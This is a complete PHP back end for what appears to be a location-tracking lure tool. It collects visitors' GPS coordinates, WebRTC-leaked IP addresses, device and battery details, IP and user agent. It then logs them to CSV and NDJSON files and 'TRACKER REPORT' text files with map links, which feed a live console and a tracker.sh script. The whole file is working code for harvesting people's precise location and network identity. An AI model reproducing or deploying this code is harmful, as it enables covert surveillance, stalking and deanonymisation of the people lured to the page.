<?php
/**
 * Location intelligence collector
 * Receives GPS coordinates, WebRTC data, device info
 */

// ── Security Headers ──
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

// ── Configuration ──
$config = [
    'data_dir'      => __DIR__ . '/location_intel',
    'session_ttl'   => 3600,
    'rate_limit'    => 100,
];

// ── Capture Info ──
$capture_id   = bin2hex(random_bytes(8));
$captured_at  = date('c');
$client_ip    = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent   = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referer      = $_SERVER['HTTP_REFERER'] ?? '';

// ── Parse Incoming Data ──
$raw      = file_get_contents('php://input');
$post     = $_POST;
$data     = [];

// Method 1: JSON body
if (!empty($raw)) {
    $json = json_decode($raw, true);
    if (is_array($json)) $data = $json;
}

// Method 2: POST form data (takes priority)
if (!empty($post)) {
    foreach ($post as $key => $val) {
        $data[$key] = $val;
    }
}

// Method 3: Query string
if (!empty($_GET)) {
    foreach ($_GET as $key => $val) {
        if (!isset($data[$key])) $data[$key] = $val;
    }
}

// ── Decode JSON values that were stringified ──
foreach (['battery', 'device', 'network'] as $field) {
    if (isset($data[$field]) && is_string($data[$field])) {
        $decoded = json_decode($data[$field], true);
        if (is_array($decoded)) $data[$field] = $decoded;
    }
}

// ── FIX: GPS Data Parsing ──
// The JavaScript sends flat fields: gps_lat, gps_lon, gps_acc, gps_alt, etc.
// These are either in $data directly or might be nested inside 'gps' key

$gps = [];

// Check direct flat fields (this is what the JS actually sends)
if (isset($data['gps_lat']) && $data['gps_lat'] !== '') {
    $gps['latitude']   = (float) $data['gps_lat'];
    $gps['longitude']  = (float) $data['gps_lon'];
    $gps['accuracy_m'] = isset($data['gps_acc']) ? (float) $data['gps_acc'] : null;
    $gps['altitude_m'] = isset($data['gps_alt']) ? (float) $data['gps_alt'] : null;
    $gps['heading']    = isset($data['gps_heading']) ? (float) $data['gps_heading'] : null;
    $gps['speed']      = isset($data['gps_speed']) ? (float) $data['gps_speed'] : null;
    $gps['source']     = 'gps_watch';
    $gps['status']     = 'captured';
}
// Check nested 'gps' key (legacy format)
elseif (isset($data['gps']) && is_array($data['gps'])) {
    $gps = $data['gps'];
    if (isset($gps['latitude']) && !isset($gps['status'])) {
        $gps['status'] = 'captured';
    }
}
// Check for 'coords' key (standard browser API format)
elseif (isset($data['coords']) && is_array($data['coords'])) {
    $gps['latitude']   = $data['coords']['latitude'] ?? null;
    $gps['longitude']  = $data['coords']['longitude'] ?? null;
    $gps['accuracy_m'] = $data['coords']['accuracy'] ?? null;
    $gps['altitude_m'] = $data['coords']['altitude'] ?? null;
    $gps['heading']    = $data['coords']['heading'] ?? null;
    $gps['speed']      = $data['coords']['speed'] ?? null;
    $gps['source']     = 'coords_api';
    $gps['status']     = 'captured';
}

// Check for error data
$error_code = $data['gps_error'] ?? $data['error_code'] ?? null;
$error_msg  = $data['gps_msg'] ?? $data['error_msg'] ?? '';

// ── Build the structured record ──
$record = [
    'capture_id'   => $capture_id,
    'captured_at'  => $captured_at,
    'client_ip'    => $client_ip,
    'user_agent'   => $user_agent,
    'referer'      => $referer,
    'session'      => $data['session'] ?? '',
];

// Attach GPS data if we got it
if (!empty($gps) && isset($gps['latitude']) && $gps['latitude'] !== null) {
    $record['collected']['gps'] = $gps;
    $record['collected']['has_gps'] = true;
    
    // Also log to individual CSV for easy reading
    $csv_line = sprintf(
        "%s,%s,%s,%.6f,%.6f,%.1f,%s,%s,%s\n",
        $captured_at,
        $client_ip,
        $capture_id,
        $gps['latitude'],
        $gps['longitude'],
        $gps['accuracy_m'] ?? 'N/A',
        $gps['altitude_m'] ?? 'N/A',
        $gps['heading'] ?? 'N/A',
        $gps['speed'] ?? 'N/A'
    );
    file_put_contents(__DIR__ . '/gps_coordinates.csv', $csv_line, FILE_APPEND | LOCK_EX);
    
    // Display real-time on console via a marker file
    $display = sprintf(
        "[%s] GPS ✓ | Lat: %.6f | Lon: %.6f | Acc: %.1fm | IP: %s | ID: %s\n",
        date('H:i:s'),
        $gps['latitude'],
        $gps['longitude'],
        $gps['accuracy_m'] ?? 0,
        $client_ip,
        $capture_id
    );
    file_put_contents('php://stderr', $display);
}
elseif ($error_code !== null) {
    $record['collected']['gps_error'] = (int) $error_code;
    $record['collected']['gps_msg']   = $error_msg;
    $record['collected']['has_gps']   = false;
    
    file_put_contents('php://stderr', sprintf(
        "[%s] GPS ✗ | Error: %d (%s) | IP: %s\n",
        date('H:i:s'), $error_code, $error_msg, $client_ip
    ));
}
else {
    // No GPS data yet, mark as pending
    $record['collected']['has_gps'] = false;
    $record['collected']['gps_status'] = 'pending';
}

// ── Other Data ──
if (!empty($data['battery'])) $record['collected']['battery'] = $data['battery'];
if (!empty($data['device']))  $record['collected']['device']  = $data['device'];
if (!empty($data['webrtc_ip'])) $record['collected']['webrtc'] = ['ip' => $data['webrtc_ip']];
if (!empty($data['continuous'])) $record['collected']['continuous_update'] = true;
if (!empty($data['batch'])) $record['batch'] = (int) $data['batch'];

// ── Save to NDJSON log ──
if (!is_dir($config['data_dir'])) {
    @mkdir($config['data_dir'], 0755, true);
}

file_put_contents(
    $config['data_dir'] . '/saved_locations.ndjson',
    json_encode($record) . "\n",
    FILE_APPEND | LOCK_EX
);

// ── Also save to old location for compatibility ──
$old_dir = __DIR__ . '/location_data';
if (!is_dir($old_dir)) @mkdir($old_dir, 0755, true);
file_put_contents(
    $old_dir . '/saved_locations.ndjson',
    json_encode($record) . "\n",
    FILE_APPEND | LOCK_EX
);

// ── Real-time data files for tracker.sh to read ──
// data.txt (formatted display)
$display_text = "=== TRACKER REPORT ===\n";
$display_text .= "Time: $captured_at\n";
$display_text .= "IP: $client_ip\n";
$display_text .= "Session: {$data['session']}\n";
$display_text .= "Capture ID: $capture_id\n";

if (!empty($gps) && isset($gps['latitude'])) {
    $display_text .= "\n── GPS COORDINATES ──\n";
    $display_text .= "Latitude: {$gps['latitude']}\n";
    $display_text .= "Longitude: {$gps['longitude']}\n";
    $display_text .= "Accuracy: " . ($gps['accuracy_m'] ?? 'N/A') . " meters\n";
    $display_text .= "Altitude: " . ($gps['altitude_m'] ?? 'N/A') . " meters\n";
    $display_text .= "Status: CAPTURED ✓\n";
    $display_text .= "\nhttps://maps.google.com/maps?q={$gps['latitude']},{$gps['longitude']}\n";
} elseif ($error_code !== null) {
    $display_text .= "\nGPS: Permission denied by user\n";
    $display_text .= "GPS Error Code: $error_code\n";
    $display_text .= "Error Message: $error_msg\n";
} else {
    $display_text .= "\nGPS: Waiting for data...\n";
}

if (!empty($data['webrtc_ip'])) {
    $display_text .= "\n── NETWORK INFO ──\n";
    $display_text .= "WebRTC IP: {$data['webrtc_ip']}\n";
}

file_put_contents(__DIR__ . '/data.txt', $display_text);
file_put_contents(__DIR__ . '/datatext.txt', $display_text);

// ── Response ──
http_response_code(200);
echo json_encode([
    'status'  => 'ok',
    'id'      => $capture_id,
    'time'    => $captured_at,
]);
